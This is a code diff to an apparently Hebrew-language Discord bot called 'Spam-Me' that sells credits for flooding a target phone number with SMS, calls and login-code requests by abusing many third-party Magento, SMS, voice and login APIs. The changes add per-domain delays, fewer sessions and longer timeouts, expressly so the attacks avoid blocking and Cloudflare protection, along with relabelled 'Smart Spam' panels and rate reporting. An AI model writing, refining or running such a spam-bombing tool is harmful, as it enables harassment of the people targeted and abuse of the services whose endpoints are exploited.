@@ -10,6 +10,7 @@ from motor.motor_asyncio import AsyncIOMotorClient
 from datetime import datetime, timedelta
 import logging
 import json
+import time
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -55,6 +56,7 @@ class CyberBot(commands.Bot):
         super().__init__(command_prefix='!', intents=intents)
         self.start_time = datetime.now()
         self.active_attacks = {}
+        self.last_request = {}  # למעקב אחרי בקשות אחרונות
     
     async def setup_hook(self):
         await self.tree.sync()
@@ -211,8 +213,17 @@ QUICK_LOGIN_APIS = [
 APIS = MAGENTO_APIS + SMS_APIS + VOICE_APIS + QUICK_LOGIN_APIS
 print(f"📊 טענתי {len(APIS)} APIs!")
 
-# ========== פונקציות שליחה ==========
-async def send_magento(session, url, phone_raw):
+# ========== פונקציות שליחה - עם דיליי חכם ==========
+async def send_magento(session, url, phone_raw, domain_delays):
+    """שליחת מג'נטו עם דיליי חכם"""
+    domain = url.split('/')[2]
+    
+    # דיליי לפי דומיין (לא לחטוף חסימה)
+    last_time = domain_delays.get(domain, 0)
+    now = time.time()
+    if now - last_time < 2:  # מינימום 2 שניות בין בקשות לאותו דומיין
+        await asyncio.sleep(2 - (now - last_time))
+    
     data = {
         "type": "login",
         "telephone": phone_raw,
@@ -224,30 +235,46 @@ async def send_magento(session, url, phone_raw):
         "X-Requested-With": "XMLHttpRequest"
     }
     try:
-        async with session.post(url, data=data, headers=headers, timeout=5) as resp:
+        async with session.post(url, data=data, headers=headers, timeout=10) as resp:
+            domain_delays[domain] = time.time()
             return resp.status in [200, 201, 202]
     except:
         return False
 
-async def send_api(session, api, phone, phone_raw, phone_intl):
+async def send_api(session, api, phone, phone_raw, phone_intl, domain_delays):
+    """שליחת API עם דיליי חכם"""
+    domain = api["url"].split('/')[2]
+    
+    # דיליי לפי דומיין
+    last_time = domain_delays.get(domain, 0)
+    now = time.time()
+    if now - last_time < 2:
+        await asyncio.sleep(2 - (now - last_time))
+    
     try:
         headers = {"User-Agent": random.choice(USER_AGENTS)}
         if api.get("type") == "form":
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
             data = api["data"].replace("PHONE", phone)
-            async with session.post(api["url"], data=data, headers=headers, timeout=5) as resp:
+            async with session.post(api["url"], data=data, headers=headers, timeout=10) as resp:
+                domain_delays[domain] = time.time()
                 return resp.status in [200, 201, 202, 204]
         else:
             headers["Content-Type"] = "application/json"
             data_str = json.dumps(api["data"])
             data_str = data_str.replace("PHONE", phone).replace("PHONE_RAW", phone_raw).replace("PHONE_INTL", phone_intl)
             data = json.loads(data_str)
-            async with session.post(api["url"], json=data, headers=headers, timeout=5) as resp:
+            
+            method = api.get("method", "POST")
+            async with session.request(method, api["url"], json=data, headers=headers, timeout=10) as resp:
+                domain_delays[domain] = time.time()
                 return resp.status in [200, 201, 202, 204]
     except:
         return False
 
-# ========== מתקפה לפי טוקנים (45 שניות לטוקן) ==========
-async def token_attack(phone, credits, user_id, interaction, attack_id):
+# ========== מתקפה חכמה נגד חסימות ==========
+async def smart_attack(phone, credits, user_id, interaction, attack_id):
+    """מתקפה חכמה שנמנעת מחסימות"""
     phone_raw = phone[3:] if phone.startswith("972") else phone[1:]
     phone_intl = f"+972{phone_raw}"
     
@@ -258,13 +285,15 @@ async def token_attack(phone, credits, user_id, interaction, attack_id):
     end_time = datetime.now() + timedelta(seconds=duration_seconds)
     
     await interaction.followup.send(
-        f"🎯 **SPAM STARTED**\n📱 {phone}\n⏱️ {credits} טוקנים = {duration_mins}ד {remaining_seconds}ש\n🎯 {len(APIS)} APIs",
+        f"🎯 **SMART SPAM STARTED**\n📱 {phone}\n⏱️ {credits} טוקנים = {duration_mins}ד {remaining_seconds}ש\n🎯 {len(APIS)} APIs\n🛡️ הגנת Cloudflare פעילה",
         ephemeral=True
     )
     
-    sessions = [aiohttp.ClientSession() for _ in range(5)]
+    # 3 סשנים בלבד - לא לחטוף חסימה
+    sessions = [aiohttp.ClientSession() for _ in range(3)]
     total_sent = 0
     last_report = 0
+    domain_delays = {}  # מעקב אחרי דומיינים
     
     try:
         while datetime.now() < end_time:
@@ -275,20 +304,27 @@ async def token_attack(phone, credits, user_id, interaction, attack_id):
             for session in sessions:
                 for api in APIS:
                     if api.get("type") == "magento":
-                        tasks.append(send_magento(session, api["url"], phone_raw))
+                        tasks.append(send_magento(session, api["url"], phone_raw, domain_delays))
                     else:
-                        tasks.append(send_api(session, api, phone, phone_raw, phone_intl))
+                        tasks.append(send_api(session, api, phone, phone_raw, phone_intl, domain_delays))
             
             results = await asyncio.gather(*tasks, return_exceptions=True)
-            total_sent += sum(1 for r in results if r is True)
+            round_sent = sum(1 for r in results if r is True)
+            total_sent += round_sent
             
+            # עדכון כל דקה
             elapsed = int((datetime.now() - (end_time - timedelta(seconds=duration_seconds))).total_seconds())
-            if elapsed - last_report >= 30:
+            if elapsed - last_report >= 60:
                 last_report = elapsed
                 remaining = duration_seconds - elapsed
-                await interaction.followup.send(f"📊 {elapsed}s עברו, {remaining}s נותרו | נשלחו: {total_sent}", ephemeral=True)
+                rate = total_sent // (elapsed // 60) if elapsed > 60 else 0
+                await interaction.followup.send(
+                    f"📊 {elapsed//60}ד: {total_sent} הודעות | {rate}/דקה | {remaining//60}ד נותרו",
+                    ephemeral=True
+                )
             
-            await asyncio.sleep(random.uniform(0.3, 0.5))
+            # המתנה ארוכה יותר בין סיבובים
+            await asyncio.sleep(random.uniform(1, 2))
     
     finally:
         for session in sessions:
@@ -297,7 +333,12 @@ async def token_attack(phone, credits, user_id, interaction, attack_id):
     if attack_id in bot.active_attacks:
         del bot.active_attacks[attack_id]
     
-    await interaction.followup.send(f"✅ **FINISHED**\n📊 סה\"כ נשלחו: {total_sent} הודעות", ephemeral=True)
+    minutes = duration_seconds // 60
+    avg_rate = total_sent // minutes if minutes > 0 else 0
+    await interaction.followup.send(
+        f"✅ **FINISHED**\n📊 סה\"כ: {total_sent} הודעות\n📈 ממוצע: {avg_rate} לדקה",
+        ephemeral=True
+    )
 
 # ========== פקודות צוות ==========
 @bot.tree.command(name="check", description="בדוק APIs (צוות)")
@@ -308,17 +349,19 @@ async def check_command(interaction: discord.Interaction):
     test_phone = "972501234567"
     test_raw = "0501234567"
     test_intl = "+972501234567"
+    domain_delays = {}
     
     working = []
     
     async with aiohttp.ClientSession() as session:
         for api in APIS[:20]:
             if api.get("type") == "magento":
-                success = await send_magento(session, api["url"], test_raw)
+                success = await send_magento(session, api["url"], test_raw, domain_delays)
             else:
-                success = await send_api(session, api, test_phone, test_raw, test_intl)
+                success = await send_api(session, api, test_phone, test_raw, test_intl, domain_delays)
             if success:
                 working.append(api["name"])
+            await asyncio.sleep(1)
     
     await interaction.followup.send(f"✅ **{len(working)}** עובדים", ephemeral=True)
 
@@ -334,7 +377,7 @@ async def add_tokens(interaction: discord.Interaction, member: discord.Member, a
     await interaction.response.send_message(f"✅ הוספת {amount} טוקנים ל{member.mention}", ephemeral=True)
 
 # ========== פאנל ראשי ==========
-class SpamModal(ui.Modal, title="Start Spam"):
+class SpamModal(ui.Modal, title="Start Smart Spam"):
     phone = ui.TextInput(
         label="Target Phone Number *",
         placeholder="054XXXXXXXX",
@@ -389,17 +432,17 @@ class SpamModal(ui.Modal, title="Start Spam"):
         remaining_sec = duration_seconds % 60
         
         await interaction.response.send_message(
-            f"✅ **SPAM ACTIVATED**\n📱 {phone}\n🎯 {credits} טוקנים = {duration_mins}ד {remaining_sec}ש\n💎 נותרו: {user_doc['tokens'] - credits}",
+            f"✅ **SMART SPAM ACTIVATED**\n📱 {phone}\n🎯 {credits} טוקנים = {duration_mins}ד {remaining_sec}ש\n💎 נותרו: {user_doc['tokens'] - credits}\n🛡️ מוגן נגד Cloudflare",
             ephemeral=True
         )
         
-        asyncio.create_task(token_attack(phone, credits, user_id, interaction, attack_id))
+        asyncio.create_task(smart_attack(phone, credits, user_id, interaction, attack_id))
 
 class MainPanel(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=180)
     
-    @discord.ui.button(label="📱 Spam Phone", style=discord.ButtonStyle.danger, emoji="💣")
+    @discord.ui.button(label="📱 Smart Spam", style=discord.ButtonStyle.danger, emoji="💣")
     async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.send_modal(SpamModal())
     
@@ -430,12 +473,12 @@ class MainPanel(discord.ui.View):
 async def panel(interaction: discord.Interaction):
     embed = discord.Embed(
         title="Spam-Me Control Panel",
-        description="Use the buttons below to interact with the bot.\nFor more info go to #info.",
+        description="Use the buttons below to interact with the bot.\nFor more info go to #info.\n\n🛡️ **מוגן נגד Cloudflare** - דיליי חכם מונע חסימות",
         color=0x2b2d31
     )
     embed.add_field(
-        name="📱 **Spam Phone**",
-        value="Sending SMS & Call & Whatsapp (costs credits)",
+        name="📱 **Smart Spam**",
+        value="SMS & Calls with Cloudflare protection (costs credits)",
         inline=False
     )
     embed.add_field(
@@ -448,7 +491,7 @@ async def panel(interaction: discord.Interaction):
         value="Purchase more credits via our website",
         inline=True
     )
-    embed.set_footer(text="1 credit = 45 seconds of spam")
+    embed.set_footer(text=f"1 credit = 45 seconds • {len(APIS)} APIs")
     
     view = MainPanel()
     await interaction.response.send_message(embed=embed, view=view)
@@ -474,4 +517,5 @@ if __name__ == "__main__":
     print(f"🎯 פאנל Spam-Me מוכן עם {len(APIS)} APIs!")
     print(f"🔒 רול מורשה: {ALLOWED_ROLE_ID}")
     print(f"⏱️ 1 טוקן = 45 שניות")
+    print(f"🛡️ הגנת Cloudflare: פעילה (דיליי 1-2 שניות)")
     bot.run(TOKEN)
